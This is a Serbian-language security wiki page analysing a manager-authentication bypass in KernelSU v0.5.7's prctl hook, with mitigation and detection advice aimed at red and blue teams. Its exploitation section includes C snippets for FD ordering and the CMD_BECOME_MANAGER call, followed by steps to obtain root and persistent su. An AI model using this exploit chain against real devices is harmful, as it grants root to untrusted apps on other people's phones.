# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

Rooting frameworks kao što su KernelSU, APatch i SKRoot patch-uju ili hook-uju Android/Linux kernel i izlažu privilegovane funkcionalnosti neprivilegovanom userspace manager app-u. Magisk se razmatra zasebno u nastavku, jer je CVE-2024-48336 obuhvatao učitavanje koda na strani manager-a, a ne ovaj KernelSU syscall path.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ova stranica predstavlja apstrakciju tehnika i problema otkrivenih u javnim istraživanjima (naročito u Zimperium analizi KernelSU v0.5.7), kako bi se red i blue timovima pomoglo da razumeju attack surface, exploitation primitive i robusne mitigacije.<sup>[[1]](#references)</sup>

---
## Arhitektonski obrazac: syscall-hooked manager channel

- U KernelSU v0.5.7, kernel hook na `prctl` prima magic value, command ID i argumente specifične za command iz userspace-a.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller prvo zahteva status manager-a pomoću `CMD_BECOME_MANAGER`. Authorization je specifičan za command: `CMD_GRANT_ROOT` proverava stanje manager/allowlist-a, `CMD_ALLOW_SU` je dostupan samo manager-u, a `CMD_SET_SEPOLICY` je u ovoj verziji dostupan samo root-u.<sup>[[2]](#references)[[11]](#references)</sup>
- Ostali command-i upituju verziju/konfiguraciju ili prijavljuju događaje framework-a.<sup>[[2]](#references)</sup>
- Pošto svaka app može da pozove ovaj syscall interface, ispravnost autentifikacije manager-a je od ključnog značaja.<sup>[[1]](#references)[[2]](#references)</sup>

Primer (KernelSU dizajn):
- Hooked syscall: prctl
- Magic value za preusmeravanje ka KernelSU handler-u: 0xDEADBEEF
- Command-i uključuju: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, itd.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (kako je implementiran)

Kada userspace pozove prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU proverava:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Provera prefiksa path-a
- Dostavljeni path mora da počinje očekivanim prefiksom za UID caller-a, npr. /data/data/<pkg> ili /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) logika provere prefiksa path-a.<sup>[[2]](#references)</sup>

2) Provera vlasništva
- Vlasnik path-a mora biti UID caller-a.
- Reference: core_hook.c (v0.5.7) logika provere vlasništva.<sup>[[2]](#references)</sup>

3) Provera APK signature putem FD table scan-a
- Prolazi kroz open file descriptors pozivajućeg process-a redosledom rastućeg descriptor broja.
- Za svaki regular file čiji path počinje sa `/data/app/` i završava se sa `/base.apk`, zahteva se da path sadrži package substring izveden iz dostavljenog data-directory path-a.
- Proverava signature prvog kandidata koji prođe te provere path-a.
- Parsira APK v2 signature i proverava je u odnosu na zvanični manager certificate.
- Reference: manager.c (iteriranje kroz FD-ove), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Ako sve provere prođu, kernel privremeno kešira UID manager-a; command-i dostupni samo manager-u tada prihvataju taj UID, dok ostali command-i zadržavaju sopstvene UID ili allowlist provere.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Klasa ranjivosti: oslanjanje na izbor APK-a izveden iz path-a

KernelSU v0.5.7 ne povezuje rezultat signature provere sa identitetom instaliranog package-a u PackageManager-u. U `manager.c`, provera package-a je samo provera substring-a u path-u (`strstr(cwd, pkg)`); zatim se proverava signature prvog kandidata koji prođe tu proveru. Napadač zato može da postavi autentičan manager APK pod `/data/app/` path koji takođe sadrži ime package-a napadača i da obezbedi da taj APK bude prvi izabran.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Ovo poverenje zasnovano na indirekciji omogućava neprivilegovanoj app da se predstavlja kao manager bez posedovanja signing key-ja manager-a.<sup>[[1]](#references)</sup>

Ključna svojstva koja se iskorišćavaju:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan je uređen prema descriptor index-u, a provera package-a je provera substring-a u path-u, a ne verifikovano povezivanje package-to-APK identity.
- open() vraća najniži dostupan FD. Zatvaranjem FD-ova sa nižim brojem unapred, napadač može da kontroliše redosled.
- Bundled manager APK može biti postavljen pod `/data/app/` na path-u koji sadrži package string napadača, uz zadržavanje zvanične manager signature.

---
## Preduslovi napada

Konkretan slučaj KernelSU v0.5.7 zahteva:<sup>[[1]](#references)[[3]](#references)</sup>

- Uređaj je već rootovan pomoću ranjivog rooting framework-a (npr. KernelSU v0.5.7).
- Napadač može lokalno da pokrene proizvoljan neprivilegovan code (Android app process).
- Za implementaciju v0.5.7, `current->real_parent` mora imati UID 0 (source comment ovo opisuje kao zahtev da je process direct child zygote-a); `manager.c` odbija druge parent-e.<sup>[[3]](#references)</sup>
- Pravi manager još nije autentifikovan (npr. neposredno nakon reboot-a). Neki framework-ovi keširaju UID manager-a nakon uspeha; morate dobiti race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

Koraci visokog nivoa (u citiranom demo video-snimku prikazan je javni proof of concept u radu):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Napravite validan path ka sopstvenom app data directory-ju kako biste zadovoljili provere prefiksa i vlasništva.
2) Postavite autentičan KernelSU Manager base.apk pod `/data/app/` na path-u koji sadrži vaš package string, a zatim ga otvorite na FD-u sa nižim brojem od FD-a sopstvenog base.apk-a.
3) Pozovite prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) da biste prošli provere.
4) Koristite `CMD_GRANT_ROOT`, zatim `CMD_ALLOW_SU` za perzistentni su; root-only `CMD_SET_SEPOLICY` pozovite tek nakon dobijanja root-a i samo tamo gde je podržan.

Praktične napomene za korak 2 (FD ordering):<sup>[[1]](#references)</sup>
- Identifikujte FD svog process-a za sopstveni /data/app/*/base.apk prolaskom kroz symlink-ove u /proc/self/fd.
- Zatvorite FD sa niskim brojem (npr. stdin, fd 0) i prvo otvorite legitimni manager APK, kako bi zauzeo fd 0 (ili bilo koji index niži od FD-a vašeg base.apk-a).
- Bundlujte legitimni manager APK sa svojom app tako da njegov path počinje sa `/data/app/`, završava se sa `/base.apk` i sadrži vaš package string. Na primer, path unutar `lib` directory-ja vaše app može zadovoljiti ove provere.<sup>[[1]](#references)[[3]](#references)</sup>

Primeri code snippet-a (Android/Linux, samo ilustrativno):

Enumerišite otvorene FD-ove da biste pronašli base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Usmeri FD sa manjim brojem na legitimni manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autentikacija u Manager-u putem KernelSU v0.5.7 `prctl` hook-a:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Nakon uspeha, privilegovane komande (primeri):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promoviše trenutni proces u root
- CMD_ALLOW_SU: dodaje vaš package/UID na allowlist za persistent su
- CMD_SET_SEPOLICY: prilagođava SELinux policy nakon dobijanja root privilegija; KernelSU v0.5.7 proverava UID 0 za ovu komandu.<sup>[[2]](#references)</sup>

Race/persistence tip:
- Registrujte BOOT_COMPLETED receiver u AndroidManifest (`RECEIVE_BOOT_COMPLETED`) da se pokrene nakon reboot-a i pokuša authentication pre pravog manager-a; permission odobrava prijem `ACTION_BOOT_COMPLETED`, ali sama po sebi ne garantuje prioritet scheduling-a.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Smernice za detekciju i mitigation

Za developere framework-a:
- Vežite authentication za package/UID pozivaoca, a ne za proizvoljne FD-ove:
- Razrešite package pozivaoca na osnovu njegovog UID-a i proverite ga u odnosu na signature instaliranog package-a (putem PackageManager-a), umesto skeniranja FD-ova.
- Ako je kernel-only, koristite stabilni identitet pozivaoca (task creds) i validirajte ga na stabilnom source of truth-u kojim upravlja init/userspace helper, a ne na process FD-ovima.
- Izbegavajte provere path-prefix-a kao identiteta; pozivalac ih trivijalno može zadovoljiti.
- Koristite challenge–response zasnovan na nonce-u preko channel-a i obrišite svaki keširani identitet manager-a pri boot-u ili tokom ključnih događaja.
- Razmotrite authenticated IPC zasnovan na binder-u umesto preopterećivanja generic syscall-ova kada je to izvodljivo.

Za defanzivce/blue team:
- Detektujte prisustvo rooting framework-a i manager procesa; nadzirite prctl pozive sa sumnjivim magic constant-ama (npr. 0xDEADBEEF) ako imate kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- Na managed fleet-ovima blokirajte ili prijavite boot receiver-e iz nepouzdanih package-ova koji ubrzo nakon boot-a pokušavaju privilegovane manager komande.
- Obezbedite da su uređaji ažurirani na patched verzije framework-a; invalidirajte keširane manager ID-jeve nakon update-a.

Ograničenja napada:<sup>[[1]](#references)[[2]](#references)</sup>
- Utiče samo na uređaje koji su već rooted pomoću ranjivog framework-a.
- Obično zahteva reboot/race window pre nego što se legitimni manager authenticated-uje (neki framework-ovi keširaju manager UID do reset-a).

---
## Povezane napomene kroz framework-ove

- Auth zasnovan na password-u (npr. istorijski APatch/SKRoot build-ovi) može biti slab ako se password-i mogu pogoditi/bruteforce-ovati ili ako su validacije neispravne.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Auth zasnovan na package/signature-u (npr. KernelSU) u principu je jači, ali mora biti vezan za stvarnog pozivaoca, a ne za artefakte izvedene iz path-a i odabrane kroz FD scan-ove.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 je uticao na pre-Canary 27007 build-ove koji su učitavali code iz neproverenog GMS package-a, omogućavajući lokalnoj aplikaciji da izvrši code u Magisk aplikaciji i eskalira do root-a bez interakcije korisnika.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rooting svih zala: bezbednosne rupe koje bi mogle ugroziti vaš mobilni uređaj](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – authentication provere u core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – FD iteracija, package provera i signature poziv u manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – APK v2 verification u apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Verify GMS is system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identifikatori komandi u ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
